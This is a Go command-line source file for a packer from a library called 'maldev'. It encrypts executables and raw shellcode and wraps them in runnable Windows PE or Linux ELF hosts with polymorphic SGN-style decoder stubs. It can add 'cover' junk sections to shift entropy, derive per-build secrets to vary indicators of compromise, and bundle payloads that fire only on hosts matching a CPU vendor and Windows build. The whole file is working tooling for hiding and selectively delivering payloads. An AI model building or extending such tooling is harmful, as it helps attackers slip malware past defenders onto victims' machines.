// Command packer is a thin CLI wrapper around
// [github.com/oioio-space/maldev/pe/packer].
//
// Usage:
//
//	packer pack   -in <file> -out <file> [-key <hex32>] [-keyout <file>]
//	              [-format blob|windows-exe|linux-elf] [-rounds N] [-seed S]
//	              [-cover]
//	packer unpack -in <file> -out <file>  -key <hex32>
//	packer bundle -out <file> -pl <spec> [-pl <spec> ...] [-fallback exit|crash|first]
//
// pack:
//   - reads `-in`,
//   - when -format=blob (default): runs Pack with default options
//     (AES-GCM, no compression) and writes the encrypted blob to
//     `-out`, printing the AEAD key to stdout as hex (or to
//     `-keyout` when set).
//   - when -format=windows-exe (Phase 1e-A): runs PackBinary, writes
//     a runnable PE32+ to `-out`, and prints the AEAD key to stdout.
//     Use -rounds (default 3) and -seed (default 0 = crypto-random)
//     to tune the polymorphic stage-1 decoder.
//   - when -format=linux-elf (Phase 1e-B): runs PackBinary, writes
//     a runnable ELF64 static-PIE to `-out`, and prints the AEAD key
//     to stdout. Same -rounds/-seed knobs as windows-exe.
//
// unpack:
//   - reads `-in`,
//   - runs Unpack with the `-key` hex string,
//   - writes the recovered bytes to `-out`.
//
// bundle (C6 multi-target wire format):
//   - takes one or more `-pl <file>:<vendor>:<min>-<max>` specs and
//     packs them into a single bundle blob. <vendor> is one of
//     "intel", "amd", or "*" (wildcard); <min>-<max> is the inclusive
//     Windows build-number range (use "*" on either side for "no
//     bound"). E.g. -pl payload-w11.exe:intel:22000-99999.
//   - -fallback selects the no-match behaviour: "exit" (default),
//     "crash", or "first".
//   - The output is the bundle blob — the runtime stub-side evaluator
//     is C6-P3/P4 work; until then operators inspect the bundle on
//     the build host via `packer bundle -inspect`.
package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/oioio-space/maldev/pe/packer"
	"github.com/oioio-space/maldev/pe/packer/transform"
)

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}
	switch os.Args[1] {
	case "pack":
		os.Exit(runPack(os.Args[2:]))
	case "unpack":
		os.Exit(runUnpack(os.Args[2:]))
	case "bundle":
		os.Exit(runBundle(os.Args[2:]))
	case "shellcode":
		os.Exit(runShellcode(os.Args[2:]))
	case "-h", "--help", "help":
		usage()
		return
	default:
		fmt.Fprintf(os.Stderr, "unknown subcommand %q\n\n", os.Args[1])
		usage()
		os.Exit(2)
	}
}

func usage() {
	fmt.Fprint(os.Stderr, `packer — maldev pe/packer CLI

Usage:
  packer pack   -in <file> -out <file> [-format blob|windows-exe|linux-elf]
                [-key <hex32>] [-keyout <file>]
                [-rounds N] [-seed S] [-cover]
  packer unpack -in <file> -out <file>  -key <hex32>
  packer bundle -out <file> -pl <spec> [-pl <spec> ...]
                [-fallback exit|crash|first]
  packer bundle -inspect <bundle>
  packer bundle -match   <bundle>
  packer bundle -wrap    <launcher> -bundle <bundle> -out <exe>
  packer shellcode -in <sc> -out <bin> [-format windows-exe|linux-elf]
                   [-encrypt] [-base 0xHEX]
                   [-rounds N] [-seed S] [-key <hex32>] [-keyout <file>]

Formats:
  blob         (default) AES-GCM encrypted bytes; key printed as 64-char hex
  windows-exe  Phase 1e-A runnable PE32+; AEAD key printed as hex.
               -rounds (default 3) and -seed (default 0 = crypto-random)
               tune the polymorphic SGN-style stage-1 decoder.
  linux-elf    Phase 1e-B runnable ELF64 static-PIE; AEAD key printed as hex.
               Same -rounds/-seed knobs as windows-exe.

Bundle spec syntax (-pl):
  <file>:<vendor>:<min>-<max>
    vendor ∈ {intel | amd | *}        (* = any vendor)
    min/max = Windows build number    (use * for "no bound")
  e.g. -pl payload-w11.exe:intel:22000-99999
       -pl payload-w10.exe:amd:10000-19999
       -pl fallback.exe:*:*-*
  Fallback behaviour: exit (silent), crash (loud), first (always payload 0).
  Bundle workflows:
    - inspect:   packer bundle -inspect <bundle>
                 (decode header + per-entry summary)
    - dry-run:   packer bundle -match   <bundle>
                 (reads host CPUID + Windows build, prints which
                  payload would fire on this host)
    - wrap:      packer bundle -wrap <launcher> -bundle <bundle> -out <exe>
                 (concatenate the bundle to a pre-built launcher
                  binary — see cmd/bundle-launcher — producing a
                  single-file runnable executable that dispatches
                  via CPUID + Win build at runtime)
`)
}

func runPack(args []string) int {
	fs := flag.NewFlagSet("pack", flag.ExitOnError)
	in := fs.String("in", "", "input file (PE EXE or arbitrary bytes)")
	out := fs.String("out", "", "output file path")
	keyHex := fs.String("key", "", "AEAD key as 64-char hex (default: generate fresh)")
	keyOut := fs.String("keyout", "", "write the AEAD key to this file (hex); default: stdout")
	format := fs.String("format", "blob", `output format: "blob" (legacy: encrypted bytes), "windows-exe" (Phase 1e-A: runnable PE32+), "linux-elf" (Phase 1e-B: runnable ELF static-PIE)`)
	rounds := fs.Int("rounds", 3, "SGN polymorphism rounds (1-10); windows-exe and linux-elf")
	seed := fs.Int64("seed", 0, "poly seed (0 = crypto-random); windows-exe and linux-elf")
	cover := fs.Bool("cover", false, "after PackBinary, chain ApplyDefaultCover (3 junk sections of mixed entropy); windows-exe and linux-elf only")
	_ = fs.Parse(args)

	if *in == "" || *out == "" {
		fmt.Fprintln(os.Stderr, "pack: -in and -out are required")
		return 2
	}

	data, err := os.ReadFile(*in)
	if err != nil {
		fmt.Fprintf(os.Stderr, "pack: read %s: %v\n", *in, err)
		return 1
	}

	switch *format {
	case "blob":
		if *cover {
			fmt.Fprintln(os.Stderr, "pack: -cover only applies to -format=windows-exe / linux-elf")
			return 2
		}
		return runPackBlob(data, *out, *keyHex, *keyOut)
	case "windows-exe":
		return runPackBinary(data, *out, packer.FormatWindowsExe, *rounds, *seed, *cover)
	case "linux-elf":
		return runPackBinary(data, *out, packer.FormatLinuxELF, *rounds, *seed, *cover)
	default:
		fmt.Fprintf(os.Stderr, "pack: unknown format %q (want \"blob\", \"windows-exe\", or \"linux-elf\")\n", *format)
		return 1
	}
}

// runPackBlob is the legacy encrypted-bytes path (Phase 1a/1c).
// ELF inputs are pre-flight validated against Stage C+D's Z-scope
// gate so a misconfigured build fails at pack time, not at deploy.
func runPackBlob(data []byte, out, keyHex, keyOut string) int {
	if transform.DetectFormat(data) == transform.FormatELF {
		if err := packer.ValidateELF(data); err != nil {
			fmt.Fprintf(os.Stderr, "packer: input is not a loadable Go static-PIE: %v\n", err)
			fmt.Fprintln(os.Stderr, "rebuild with: CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -buildmode=pie -ldflags='-s -w' -o <out> <pkg>")
			return 1
		}
	}

	opts := packer.Options{}
	var err error
	if keyHex != "" {
		opts.Key, err = hex.DecodeString(keyHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "pack: -key invalid hex: %v\n", err)
			return 2
		}
	}

	blob, key, err := packer.Pack(data, opts)
	if err != nil {
		fmt.Fprintf(os.Stderr, "pack: %v\n", err)
		return 1
	}
	if err := os.WriteFile(out, blob, 0o644); err != nil {
		fmt.Fprintf(os.Stderr, "pack: write %s: %v\n", out, err)
		return 1
	}

	keyStr := hex.EncodeToString(key) + "\n"
	if keyOut != "" {
		if err := os.WriteFile(keyOut, []byte(keyStr), 0o600); err != nil {
			fmt.Fprintf(os.Stderr, "pack: write key to %s: %v\n", keyOut, err)
			return 1
		}
	} else {
		fmt.Print(keyStr)
	}

	fmt.Fprintf(os.Stderr, "packed %d bytes → %s (%d bytes)\n", len(data), out, len(blob))
	return 0
}

// runPackBinary wraps the payload in a polymorphic host binary via
// PackBinary. The AEAD key is printed to stdout — it is NOT stored in
// the output binary, so the caller must capture it for out-of-band
// delivery.
//
// When cover is true, the output is additionally run through
// ApplyDefaultCover. ELF inputs without PHT slack (Go static-PIE)
// surface a non-fatal warning and ship the bare PackBinary output;
// PE always succeeds because section-table slack is plentiful.
func runPackBinary(data []byte, out string, format packer.Format, rounds int, seed int64, cover bool) int {
	hostBytes, key, err := packer.PackBinary(data, packer.PackBinaryOptions{
		Format:       format,
		Stage1Rounds: rounds,
		Seed:         seed,
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "pack: %v\n", err)
		return 1
	}
	finalBytes := hostBytes
	if cover {
		// Use seed+1 so the cover layer's RNG diverges from the
		// PackBinary RNG. Falling back to the bare output on the
		// PHT-slack limitation matches the worked-example flow.
		coverSeed := seed + 1
		if coverSeed == 0 {
			coverSeed = 1
		}
		covered, coverErr := packer.ApplyDefaultCover(hostBytes, coverSeed)
		switch {
		case coverErr == nil:
			finalBytes = covered
			fmt.Fprintf(os.Stderr, "cover: %d → %d bytes\n", len(hostBytes), len(covered))
		default:
			fmt.Fprintf(os.Stderr, "cover: skipped (%v)\n", coverErr)
		}
	}
	if err := os.WriteFile(out, finalBytes, 0o755); err != nil {
		fmt.Fprintf(os.Stderr, "pack: write %s: %v\n", out, err)
		return 1
	}
	fmt.Printf("%x\n", key)
	fmt.Fprintf(os.Stderr, "packed %d bytes → %s (%d bytes)\n", len(data), out, len(finalBytes))
	return 0
}

func runUnpack(args []string) int {
	fs := flag.NewFlagSet("unpack", flag.ExitOnError)
	in := fs.String("in", "", "input blob path")
	out := fs.String("out", "", "recovered output path")
	keyHex := fs.String("key", "", "AEAD key as 64-char hex (required)")
	_ = fs.Parse(args)

	if *in == "" || *out == "" || *keyHex == "" {
		fmt.Fprintln(os.Stderr, "unpack: -in, -out, -key all required")
		return 2
	}
	key, err := hex.DecodeString(*keyHex)
	if err != nil {
		fmt.Fprintf(os.Stderr, "unpack: -key invalid hex: %v\n", err)
		return 2
	}

	blob, err := os.ReadFile(*in)
	if err != nil {
		fmt.Fprintf(os.Stderr, "unpack: read %s: %v\n", *in, err)
		return 1
	}
	data, err := packer.Unpack(blob, key)
	if err != nil {
		fmt.Fprintf(os.Stderr, "unpack: %v\n", err)
		return 1
	}
	if err := os.WriteFile(*out, data, 0o644); err != nil {
		fmt.Fprintf(os.Stderr, "unpack: write %s: %v\n", *out, err)
		return 1
	}
	fmt.Fprintf(os.Stderr, "unpacked → %s (%d bytes)\n", *out, len(data))
	return 0
}

// stringSliceFlag accumulates repeated -pl flags.
type stringSliceFlag []string

func (s *stringSliceFlag) String() string     { return fmt.Sprintf("%v", *s) }
func (s *stringSliceFlag) Set(v string) error { *s = append(*s, v); return nil }

// runBundle implements `packer bundle` — C6 multi-target wire format.
//
// One -pl flag per payload, syntax: <file>:<vendor>:<min>-<max>
// where vendor ∈ {intel, amd, *} and min/max are Windows build numbers
// or "*" for "no bound on this side".
func runBundle(args []string) int {
	fs := flag.NewFlagSet("bundle", flag.ExitOnError)
	out := fs.String("out", "", "output bundle blob path")
	fallback := fs.String("fallback", "exit", "no-match behaviour: exit | crash | first")
	inspect := fs.String("inspect", "", "inspect an existing bundle blob and exit (path)")
	match := fs.String("match", "", "report which payload would fire on this host and exit (path)")
	wrap := fs.String("wrap", "", "append a bundle blob to a launcher binary, producing a runnable executable (path to launcher)")
	bundlePath := fs.String("bundle", "", "bundle blob to wrap (used with -wrap)")
	secret := fs.String("secret", "", "per-build IOC secret — derives a unique BundleMagic + footer via SHA-256 (Kerckhoffs); operator must build the launcher with the same secret via -ldflags '-X main.bundleSecret=<secret>'")
	var pls stringSliceFlag
	fs.Var(&pls, "pl", "payload spec: <file>:<vendor>:<min>-<max>; repeatable")
	if err := fs.Parse(args); err != nil {
		fmt.Fprintln(os.Stderr, err)
		return 2
	}

	if *inspect != "" {
		return runBundleInspect(*inspect)
	}
	if *match != "" {
		return runBundleMatch(*match)
	}
	if *wrap != "" {
		return runBundleWrap(*wrap, *bundlePath, *out, *secret)
	}
	if *out == "" || len(pls) == 0 {
		fmt.Fprintln(os.Stderr, "bundle: -out and at least one -pl required (or use -inspect)")
		return 2
	}

	payloads := make([]packer.BundlePayload, 0, len(pls))
	for i, spec := range pls {
		bp, err := parseBundleSpec(spec)
		if err != nil {
			fmt.Fprintf(os.Stderr, "bundle: -pl[%d] %q: %v\n", i, spec, err)
			return 1
		}
		payloads = append(payloads, bp)
	}

	var fb packer.BundleFallbackBehaviour
	switch *fallback {
	case "exit":
		fb = packer.BundleFallbackExit
	case "crash":
		fb = packer.BundleFallbackCrash
	case "first":
		fb = packer.BundleFallbackFirst
	default:
		fmt.Fprintf(os.Stderr, "bundle: unknown -fallback %q (want exit|crash|first)\n", *fallback)
		return 2
	}

	bundleOpts := packer.BundleOptions{FallbackBehaviour: fb}
	if *secret != "" {
		bundleOpts.Profile = packer.DeriveBundleProfile([]byte(*secret))
	}
	blob, err := packer.PackBinaryBundle(payloads, bundleOpts)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle:", err)
		return 1
	}
	if err := os.WriteFile(*out, blob, 0o644); err != nil {
		fmt.Fprintln(os.Stderr, "bundle: write:", err)
		return 1
	}
	fmt.Fprintf(os.Stderr, "bundle: wrote %d bytes to %s (%d payloads, fallback=%s)\n",
		len(blob), *out, len(payloads), *fallback)
	return 0
}

// parseBundleSpec parses a `-pl <file>:<vendor>:<min>-<max>` spec.
func parseBundleSpec(spec string) (packer.BundlePayload, error) {
	parts := strings.SplitN(spec, ":", 3)
	if len(parts) != 3 {
		return packer.BundlePayload{}, fmt.Errorf("expected <file>:<vendor>:<min>-<max>, got %d colon-separated parts", len(parts))
	}
	file, vendorStr, rangeStr := parts[0], parts[1], parts[2]

	bin, err := os.ReadFile(file)
	if err != nil {
		return packer.BundlePayload{}, fmt.Errorf("read payload: %w", err)
	}

	pred := packer.FingerprintPredicate{}
	switch strings.ToLower(vendorStr) {
	case "intel":
		copy(pred.VendorString[:], "GenuineIntel")
		pred.PredicateType |= packer.PTCPUIDVendor
	case "amd":
		copy(pred.VendorString[:], "AuthenticAMD")
		pred.PredicateType |= packer.PTCPUIDVendor
	case "*", "":
		// wildcard — leave PTCPUIDVendor unset; if range is also wildcard,
		// fall back to PTMatchAll below.
	default:
		return packer.BundlePayload{}, fmt.Errorf("vendor %q: want intel | amd | *", vendorStr)
	}

	rng := strings.SplitN(rangeStr, "-", 2)
	if len(rng) != 2 {
		return packer.BundlePayload{}, fmt.Errorf("range %q: expected <min>-<max>", rangeStr)
	}
	parseBound := func(s string) (uint32, error) {
		if s == "" || s == "*" {
			return 0, nil
		}
		v, err := strconv.ParseUint(s, 10, 32)
		if err != nil {
			return 0, fmt.Errorf("build %q: %w", s, err)
		}
		return uint32(v), nil
	}
	bMin, err := parseBound(rng[0])
	if err != nil {
		return packer.BundlePayload{}, err
	}
	bMax, err := parseBound(rng[1])
	if err != nil {
		return packer.BundlePayload{}, err
	}
	pred.BuildMin = bMin
	pred.BuildMax = bMax
	if bMin != 0 || bMax != 0 {
		pred.PredicateType |= packer.PTWinBuild
	}

	if pred.PredicateType == 0 {
		pred.PredicateType = packer.PTMatchAll
	}
	return packer.BundlePayload{Binary: bin, Fingerprint: pred}, nil
}

// runBundleWrap concatenates a bundle blob onto a pre-built launcher
// binary (typically `cmd/bundle-launcher`) via [packer.AppendBundle],
// producing a single-file executable that dispatches at runtime via
// CPUID + Win build fingerprinting. The output preserves the
// launcher's executable bit on the file.
func runBundleWrap(launcherPath, bundlePath, outPath, secret string) int {
	if launcherPath == "" || bundlePath == "" || outPath == "" {
		fmt.Fprintln(os.Stderr, "bundle wrap: -wrap, -bundle, and -out are all required")
		return 2
	}
	launcher, err := os.ReadFile(launcherPath)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle wrap: read launcher:", err)
		return 1
	}
	bundle, err := os.ReadFile(bundlePath)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle wrap: read bundle:", err)
		return 1
	}

	profile := packer.BundleProfile{}
	if secret != "" {
		profile = packer.DeriveBundleProfile([]byte(secret))
	}
	if _, err := packer.InspectBundleWith(bundle, profile); err != nil {
		fmt.Fprintln(os.Stderr, "bundle wrap: bundle does not parse:", err)
		return 1
	}
	wrapped := packer.AppendBundleWith(launcher, bundle, profile)
	if err := os.WriteFile(outPath, wrapped, 0o755); err != nil {
		fmt.Fprintln(os.Stderr, "bundle wrap: write output:", err)
		return 1
	}
	fmt.Fprintf(os.Stderr, "bundle wrap: wrote %d bytes (%d launcher + %d bundle + 16-byte footer) to %s\n",
		len(wrapped), len(launcher), len(bundle), outPath)
	if secret != "" {
		fmt.Fprintf(os.Stderr,
			"bundle wrap: NOTE — launcher must be built with the same secret. Build it with:\n"+
				"  go build -ldflags \"-X main.bundleSecret=%s\" -o bundle-launcher ./cmd/bundle-launcher\n",
			secret)
	}
	return 0
}

// runBundleMatch loads a bundle blob and reports which entry would fire
// on the current host (CPUID vendor + Windows build, via
// [packer.MatchBundleHost]). Exits 0 with the matched index on stdout
// when a match is found; exits 0 with "no-match" when nothing matches
// (operator can pair this with the `-fallback` build-time choice);
// exits 1 on parse / IO errors.
func runBundleMatch(path string) int {
	blob, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle match:", err)
		return 1
	}
	idx, err := packer.MatchBundleHost(blob)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle match:", err)
		return 1
	}
	vendor := packer.HostCPUIDVendor()
	v := strings.TrimRight(string(vendor[:]), "\x00")
	if idx < 0 {
		fmt.Printf("no-match host-vendor=%q\n", v)
		return 0
	}
	fmt.Printf("match index=%d host-vendor=%q\n", idx, v)
	return 0
}

// runBundleInspect walks a bundle blob and prints its header + per-entry
// summary to stdout via [packer.InspectBundle]. Build-host debugging aid.
func runBundleInspect(path string) int {
	blob, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle inspect:", err)
		return 1
	}
	info, err := packer.InspectBundle(blob)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle inspect:", err)
		return 1
	}

	fmt.Printf("bundle %s — %d bytes\n", path, len(blob))
	fmt.Printf("  magic=%#x version=%#x count=%d fb=%d\n",
		info.Magic, info.Version, info.Count, info.FallbackBehaviour)
	fmt.Printf("  fpTable=%#x plTable=%#x data=%#x\n",
		info.FpTableOffset, info.PayloadTableOffset, info.DataOffset)
	for i, e := range info.Entries {
		vendor := "*"
		if e.PredicateType&packer.PTCPUIDVendor != 0 {
			vendor = strings.TrimRight(string(e.VendorString[:]), "\x00")
		}
		fmt.Printf("  [%d] pred=%#02x vendor=%-12s build=[%d, %d] data=%#x..+%d\n",
			i, e.PredicateType, vendor, e.BuildMin, e.BuildMax, e.DataRVA, e.DataSize)
	}
	return 0
}

// runShellcode wraps raw shellcode bytes in a runnable PE32+ or
// ELF64 host via packer.PackShellcode. -encrypt flips the runnable
// host through the polymorphic SGN-style stub envelope.
func runShellcode(args []string) int {
	fs := flag.NewFlagSet("shellcode", flag.ExitOnError)
	in := fs.String("in", "", "shellcode bytes file (raw, position-independent)")
	out := fs.String("out", "", "output binary path")
	format := fs.String("format", "linux-elf", `host format: "windows-exe" (PE32+) or "linux-elf" (ELF64 ET_EXEC)`)
	encrypt := fs.Bool("encrypt", false, "wrap host through PackBinary's SGN-style stub envelope")
	base := fs.String("base", "", "per-build ImageBase / vaddr override (hex, e.g. 0x180000000); empty = canonical default")
	rounds := fs.Int("rounds", 3, "SGN polymorphism rounds (1-10); -encrypt only")
	seed := fs.Int64("seed", 0, "poly seed (0 = crypto-random); -encrypt only")
	keyHex := fs.String("key", "", "AEAD key as 64-char hex (default: generate fresh); -encrypt only")
	keyOut := fs.String("keyout", "", "write the AEAD key to this file (hex); default: stdout; -encrypt only")
	_ = fs.Parse(args)

	if *in == "" || *out == "" {
		fmt.Fprintln(os.Stderr, "shellcode: -in and -out are required")
		return 2
	}
	sc, err := os.ReadFile(*in)
	if err != nil {
		fmt.Fprintf(os.Stderr, "shellcode: read %s: %v\n", *in, err)
		return 1
	}

	opts := packer.PackShellcodeOptions{
		Encrypt:      *encrypt,
		Stage1Rounds: *rounds,
		Seed:         *seed,
	}
	switch *format {
	case "windows-exe":
		opts.Format = packer.FormatWindowsExe
	case "linux-elf":
		opts.Format = packer.FormatLinuxELF
	default:
		fmt.Fprintf(os.Stderr, "shellcode: unknown format %q (want \"windows-exe\" or \"linux-elf\")\n", *format)
		return 1
	}

	if *base != "" {
		v, err := strconv.ParseUint(strings.TrimPrefix(*base, "0x"), 16, 64)
		if err != nil {
			fmt.Fprintf(os.Stderr, "shellcode: -base %q invalid hex: %v\n", *base, err)
			return 2
		}
		opts.ImageBase = v
	}
	if *keyHex != "" {
		if !*encrypt {
			fmt.Fprintln(os.Stderr, "shellcode: -key requires -encrypt")
			return 2
		}
		opts.Key, err = hex.DecodeString(*keyHex)
		if err != nil {
			fmt.Fprintf(os.Stderr, "shellcode: -key invalid hex: %v\n", err)
			return 2
		}
	}

	bin, key, err := packer.PackShellcode(sc, opts)
	if err != nil {
		fmt.Fprintf(os.Stderr, "shellcode: %v\n", err)
		return 1
	}
	if err := os.WriteFile(*out, bin, 0o755); err != nil {
		fmt.Fprintf(os.Stderr, "shellcode: write %s: %v\n", *out, err)
		return 1
	}

	if *encrypt && key != nil {
		keyStr := hex.EncodeToString(key) + "\n"
		if *keyOut != "" {
			if err := os.WriteFile(*keyOut, []byte(keyStr), 0o600); err != nil {
				fmt.Fprintf(os.Stderr, "shellcode: write key to %s: %v\n", *keyOut, err)
				return 1
			}
		} else {
			fmt.Print(keyStr)
		}
	}
	fmt.Fprintf(os.Stderr, "shellcode: %d bytes → %s (%d bytes, encrypt=%v, format=%s)\n",
		len(sc), *out, len(bin), *encrypt, *format)
	return 0
}
